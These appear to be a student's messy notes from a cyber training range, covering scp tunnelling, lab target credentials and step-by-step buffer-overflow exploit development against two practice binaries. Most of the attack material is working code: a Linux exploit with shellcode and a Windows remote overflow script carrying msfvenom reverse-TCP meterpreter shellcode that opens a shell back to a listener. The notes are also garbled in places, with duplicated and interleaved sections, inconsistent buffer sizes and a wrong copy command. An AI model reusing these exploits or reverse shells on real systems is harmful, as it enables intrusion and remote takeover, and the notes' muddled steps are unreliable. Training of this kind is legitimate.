# scp command

## Syntax
```
scp <source> <destination>
```

## Local to Remote:
```
scp /path/to/file.txt student@10.50.XX.XX:/path/to/destination/file.txt
```

## Remote to Local:
```
ssh student@10.50.XX.XX:/path/to/source/file.txt .
```

## Remote to Local via tunnel:
```
ssh -MS /tmp/jump student@10.50.XX.XX

ssh -S /tmp/jump dummy -O forward -L 1111:192.168.28.XX:2222

scp -P 1111 creds@127.0.0.1:/path/to/source/file.txt /path/to/destination
```

## Local to Remote via tunnel:
```
scp -P 1111 /path/to/source/file.txt creds@127.0.0.1:/path/to/destination/file.txt
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Map Description

Gorgas Exploit Development (GED)
XX Mar 2023
Start Time: 1300
Duration: 4 hours

Type of Operation: DEVOPS

Objective:Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis, and stored them under /longTermStorage; however, you will be required to perform your exploits on the target systems. Maneuver through Donovian network, and successfully develop exploit to gain host access.

Tools/Techniques: Exploit binaries on target systems using the tools below.

    Python
    OllyDBG or an equivelent graphical program
        http://www.ollydbg.de/
    GNU Debugger's(GDB) Python Exploit Development Assistance Module
        https://github.com/longld/peda
    MetaSploit
        https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers

Scenario Credentials: FLAG = 3XPL01T5t@rt0F@ct1v1ty

Prior Approvals: Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis; however, you will be required to perform your exploits on the target systems. Exploit Donovian-Webserver, Donovian-Terminal, and Donovian-Manager hosts.

Scheme of Maneuver:
>Jump Box: ```10.50.37.98```
>Password: ```v0cEcUbwIzY878p```
->T1: 192.168.28.111
-->T2: 192.168.28.105

>Jump Box: ```10.50.37.98```
>Password: ```v0cEcUbwIzY878p```
->donovian_grey_host
-->T3: 192.168.150.245

Target Section:

T1 
user: ```comrade```
pass: ```StudentWebExploitPassword```
Hostname: Donovian_Webserver
IP: ```192.168.28.111```
OS: CentOS
Creds: comrade :: StudentWebExploitPassword
Last Known SSH Port: ```2222```
Action: Exploit binary.

```/.hidden/inventory.exe```
```/.secret/.verysecret.pdb```

T2 
```user: comrade```
pass: ```StudentWebExploitPassword```
Hostname: Donovian-Terminal
IP: ```192.168.28.105```
OS: unknown
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222

T3
Hostname: unknown
IP: ```192.168.150.245```
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Exploit a network service on the machine

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------# Challenge  

ELF Exploitation 1
8
Level III Challenge

Situation: Other teams have extracted this networked binary from a Donovian development network. It is believed to closely related to software running in both the Donovian and Gorgan internal networks. Discover vulnerabilities and create a reliable exploit to gain remote access. This will enable exploitation against Donovian targets and provide the basis for developing mitigations on friendly Gorgan networks. You will be required to exfil a copy from the target to your Op Station.

Provided: Executable Package: ```inventory.exe```
Task: Perform a ```local buffer overflow``` on the vulnerable Linux executable, in order to gain access to the desired intel.
Method: Utilize RE toolset and python to launch and develop exploit.

```ASLR is disabled on the target machine```.

Exploit this binary found on 192.168.28.111 at /.hidden/inventory.exe to escalate privileges from your pivot user to root.

Enter the contents of /.secret/.verysecret.pdb as the flag

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Scheme of Manuver:
```
- unset environmentals
- run executable, break the buffer
- run proc map
- first memory adress after heap, and the very last address in the stack
	- ``` find /b 0xf7de1000, 0xffffe000, 0xff(hex for jump command), 0xe4(hex for ESP) ```
- grab the first 4 memory addresses, change from little to big endian
	- nop sled ``` nop = "\x90" * 15 ```
- either msfconsole or msfvenom to generate the shellcode
	- ie
```

Before starting the scheme of manuver:
- try to identify the vulnerable function
- run it through strings on the Windows and the Linux OPs Stations

## unset environmentals
- run a "clean" gdb
```env - gdb ./file.exe```
- in the "clean gdb"
```show env```
```unset env COLUMNS```
```unset env LINES```
```run```
```info proc map```
- take hex value after after the heap & the very last hex value on the stack
- plug that into the command ```find /b 0xf7def000, 0xffffe000, 0xff, 0xe4```, run it in your gdb
- grab the first 4 "memory adddresses" hex values, convert them to little endian:
```
#0xf7df1b51 -> "\x51\x1b\xdf\xf7"
#0xf7f6674b -> "\x4b\x67\xf6\xf7"
#0xf7f72753 -> "\x53\x27\xf7\xf7"
#0xf7f72c6b -> "\x6b\x2c\xf7\xf7"
``












## run executable, break the buffer
- run a "dirty" gdb
```gdb ./file.exe```
    Challenge

Windows Buffer Overflow
8
Level III Challenge

Situation: Other teams have identified a networked binary from a Donovian development network, a copy is located with the /longTermStorage on the Donovian Webserver. It is common software for the region and is believed to be running in both the Donovian and Gorgan internal networks. Discover vulnerabilities and create a reliable exploit to gain remote access. This will enable remote exploitation against Donovian targets and provide the basis for developing mitigations on friendly Gorgan networks.

Provided:
Executable Package: SecureServerind.exe & essfunc.dll
Task: Perform a remote buffer overflow on the vulnerable Windows executable from your Linux_analyst box. Gain a shell using exploit code Method: Utilize RE toolset and python to launch and develop exploit.

Launch your remote exploit at the Donovian Windows target on 192.168.150.245 to gain initial access. Your flag is within the public documents .

- run the executable and break it
```run <<<$(./Linbuffer.py)```
- what you should have in your (buffer.py) script:
```
#!/usr/bin/env python

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

```
- the buffer that you have is from the (https://wiremask.eu/tools/buffer-overflow-pattern-generator/) website. Length I choose was 512 because this was the function that I enumerated in Ghidra:

- Take the hex value at the (eip register) and input that into the website anotated above to tell you the buffer size.

## run proc map
- after you ran the executable and broke it, go to your "clean" gdb
```run```
```
Enter a string:
	buffer (76+1)
```
## first memory adress after heap, and the very last address in the stack
	    1stAddress	2ndAddress   
``` find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4 ```
		 hex for jump command^     ^hex for ESP
   
## grab the first 4 memory addresses, change from little to big endian
- insert nop sled
``` nop = "\x90" * 15 ```

#!/usr/bin/env python
 
#buffer size is 62
 
buffer = "A" * 76
#eip = "BBBB"
eip = "\x59\x3b\xde\xf7"
#eip = "\xab\x88\xf5\xf7"
#eip = "\xfb\x45\xf6\xf7"
#eip = "\x0f\x46\xf6\xf7"
 
#Grabbing jmp esp
# command you run: 
```
find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
```
```
#0xf7de3b59 -> f7 de 3b 59 -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> f7 f5 88 ab -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> f7 f6 45 fb -> "\xfb\x45\xf6\xf7"
#0xf7f6460f -> f7 f6 46 0f -> "\x0f\x46\xf6\xf7"
 
 
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
 
 
nop = "\x90" * 15

buf =  b""
buf += b"\xdb\xcf\xb8\x96\x84\x1e\x72\xd9\x74\x24\xf4\x5b"
buf += b"\x33\xc9\xb1\x11\x31\x43\x17\x83\xc3\x04\x03\xd5"
buf += b"\x97\xfc\x87\xb3\x9c\x58\xf1\x11\xc5\x30\x2c\xf6"
buf += b"\x80\x26\x46\xd7\xe1\xc0\x97\x4f\x29\x73\xf1\xe1"
buf += b"\xbc\x90\x53\x15\xa3\x56\x54\xe5\xbf\x37\x20\xc5"
buf += b"\x10\x96\xbb\x60\x0c\x94\x5e\x1e\xfd\x76\xd7\xbb"
buf += b"\x73\xfe\x64\x26\x17\x72\xee\xdc\xf9\x02\x94\x7e"
buf += b"\x06\xb4\x07\xf7\xe7\xf7\x28"
 
print(buffer+eip+nop+buf)
```

## either msfconsole or msfvenom to generate the shellcode
- insert this payload after the nop sled in the buffer.py script

## test the memory locations, if need be all 4. Until we get the desired execution.

# buffer.py script:

```
#!/usr/bin/env python
 
#buffer size is 62
 
buffer = "A" * 76
#eip = "BBBB"
eip = "\x59\x3b\xde\xf7"
#eip = "\xab\x88\xf5\xf7"
#eip = "\xfb\x45\xf6\xf7"
#eip = "\x0f\x46\xf6\xf7"
 
#Grabbing jmp esp
# command you run: find /b 0xf7de1000, 0xffffe000, 0xff(hex for jump command), 0xe4(hex for ESP)
 
#0xf7de3b59 -> f7 de 3b 59 -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> f7 f5 88 ab -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> f7 f6 45 fb -> "\xfb\x45\xf6\xf7"
#0xf7f6460f -> f7 f6 46 0f -> "\x0f\x46\xf6\xf7"
 
 
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
 
 
nop = "\x90" * 15

buf =  b""
buf += b"\xdb\xcf\xb8\x96\x84\x1e\x72\xd9\x74\x24\xf4\x5b"
buf += b"\x33\xc9\xb1\x11\x31\x43\x17\x83\xc3\x04\x03\xd5"
buf += b"\x97\xfc\x87\xb3\x9c\x58\xf1\x11\xc5\x30\x2c\xf6"
buf += b"\x80\x26\x46\xd7\xe1\xc0\x97\x4f\x29\x73\xf1\xe1"
buf += b"\xbc\x90\x53\x15\xa3\x56\x54\xe5\xbf\x37\x20\xc5"
buf += b"\x10\x96\xbb\x60\x0c\x94\x5e\x1e\xfd\x76\xd7\xbb"
buf += b"\x73\xfe\x64\x26\x17\x72\xee\xdc\xf9\x02\x94\x7e"
buf += b"\x06\xb4\x07\xf7\xe7\xf7\x28"
 
print(buffer+eip+nop+buf)
```






-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Windows buffer overflow


    Challenge

Windows Buffer Overflow
8
Level III Challenge

Situation: Other teams have identified a networked binary from a Donovian development network, a copy is located with the /longTermStorage on the Donovian Webserver. It is common software for the region and is believed to be running in both the Donovian and Gorgan internal networks. Discover vulnerabilities and create a reliable exploit to gain remote access. This will enable remote exploitation against Donovian targets and provide the basis for developing mitigations on friendly Gorgan networks.

Provided:
Executable Package: ```SecureServerind.exe & essfunc.dll```
Task: Perform a remote buffer overflow on the vulnerable Windows executable from your Linux_analyst box. Gain a shell using exploit code Method: Utilize RE toolset and python to launch and develop exploit.

Launch your remote exploit at the Donovian Windows target on ```192.168.150.245``` to gain initial access. Your flag is within the public documents .

T3
Hostname: unknown
IP: ```192.168.150.245```
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Exploit a network service on the machine

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

```
#!/usr/bin/env python

import socket

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xa0\x12\x50\x62"
buf += "\x90" * 10

## msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.27.61 lport=5555 -b "\x00" -f python

buf += b"\xba\x7e\xf6\x84\x9b\xd9\xcc\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x59\x31\x56\x14\x03\x56\x14\x83\xc6"
buf += b"\x04\x9c\x03\x78\x73\xef\xec\x81\x84\x8f\xdd\x53"
buf += b"\xe0\xc4\x4c\x64\x62\x88\x7c\x0d\x91\xa7\x2f\x19"
buf += b"\xd1\xc5\xe7\x10\x1a\x26\x4f\x18\xc2\x09\x6f\x31"
buf += b"\x36\x08\x13\x48\x6b\xea\x2a\x83\x7e\xeb\x6b\x55"
buf += b"\xf4\x04\x21\xed\xa4\xca\x4d\xb3\x74\xbd\x50\xe4"
buf += b"\x0e\x01\x2b\x81\xd1\xf5\x87\x88\x01\xa5\x9c\xc3"
buf += b"\xb9\xce\xfb\xf3\xb8\x03\x7e\x3a\xce\x9f\xc8\x36"
buf += b"\x1b\x54\xcb\x9e\x55\x95\xfd\xde\x57\xa6\xf3\x72"
buf += b"\x56\xff\x34\x6b\x2c\x0b\x47\x16\x37\xc8\x35\xcc"
buf += b"\xb2\xce\x9e\x87\x65\x2a\x1e\x4b\xf3\xb9\x2c\x20"
buf += b"\x77\xe5\x30\xb7\x54\x9e\x4d\x3c\x5b\x70\xc4\x06"
buf += b"\x78\x54\x8c\xdd\xe1\xcd\x68\xb3\x1e\x0d\xd4\x6c"
buf += b"\xbb\x46\xf7\x7b\xbb\xa7\x07\x84\xe1\x3f\xcb\x49"
buf += b"\x1a\xbf\x43\xd9\x69\x8d\xcc\x71\xe6\xbd\x85\x5f"
buf += b"\xf1\xb4\x82\x5f\x2d\x7e\xc2\xa1\xce\x7e\xca\x65"
buf += b"\x9a\x2e\x64\x4f\xa3\xa5\x74\x70\x76\x53\x7f\xe6"
buf += b"\x73\x91\x64\xcb\xeb\xd7\x9a\x26\x5f\x5e\x7c\x18"
buf += b"\xcf\x30\xd1\xd9\xbf\xf0\x81\xb1\xd5\xff\xfe\xa2"
buf += b"\xd5\x2a\x97\x49\x3a\x82\xcf\xe5\xa3\x8f\x84\x94"
buf += b"\x2c\x1a\xe1\x97\xa7\xae\x15\x59\x40\xdb\x05\x8e"
buf += b"\x37\x23\xd6\x4f\xd2\x23\xbc\x4b\x74\x74\x28\x56"
buf += b"\xa1\xb2\xf7\xa9\x84\xc1\xf0\x56\x59\xf3\x8b\x61"
buf += b"\xcf\xbb\xe3\x8d\x1f\x3b\xf4\xdb\x75\x3b\x9c\xbb"
buf += b"\x2d\x68\xb9\xc3\xfb\x1d\x12\x56\x04\x77\xc6\xf1"
buf += b"\x6c\x75\x31\x35\x33\x86\x14\x45\x34\x78\xea\x62"
buf += b"\x9d\x10\x14\x33\x1d\xe0\x7e\xb3\x4d\x88\x75\x9c"
buf += b"\x62\x78\x75\x37\x2b\x10\xfc\xd6\x99\x81\x01\xf3"
buf += b"\x7c\x1f\x01\xf0\xa4\x90\x78\x79\x5a\x51\x7d\x93"
buf += b"\x3f\x52\x7d\x9b\x41\x6f\xab\xa2\x37\xae\x6f\x91"
buf += b"\x48\x85\xd2\xb0\xc2\xe5\x41\xc2\xc6"



## 625012A0 -> "\xa0\x12\x50\x62"

s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM ) ## Create IPv4, tcp
s.connect(("192.168.65.10", 9999)) ## Private IP of WinOps and secureserver port
print s.recv(1024) ## Print to screen what we recieve
s.send(buf) ## Send our buf variable
print s.recv(1024) ## Print to screen what we recieve
s.close ## Close the socket
```

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


stat .
